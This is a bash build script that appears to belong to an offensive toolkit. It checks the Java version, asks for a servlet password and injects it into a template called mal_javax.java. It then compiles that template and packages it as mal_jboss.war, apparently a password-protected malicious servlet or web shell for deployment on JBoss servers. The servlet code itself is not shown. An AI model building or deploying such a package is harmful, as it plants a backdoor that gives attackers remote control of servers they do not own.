#!/bin/bash

### Requires JDK versions >=11
jdk_version=$(java -version 2>&1 | head -n 1)

ok=0
if [[ $jdk_version =~ ^.*1[1-9]+\.0.*$ ]]; then
	ok=1
fi

if [[ $ok == 0 ]]; then
	echo "Requires JDK versions >=11"
	exit
fi

read -p "Insert servlet password: " pass

compile_version=7

cd src/WEB-INF/classes/
cat mal_javax.java_tmpl | sed "s/<<PASSWORD>>/$pass/g" > mal_javax.java
javac -cp ../../../lib/jakarta.servlet-api-4.0.3.jar:. -source $compile_version -target $compile_version mal_javax.java

cd ../../
zip -R mal_jboss.war index.html META-INF WEB-INF/web.xml WEB-INF/classes/mal_javax.class
mv mal_jboss.war ..
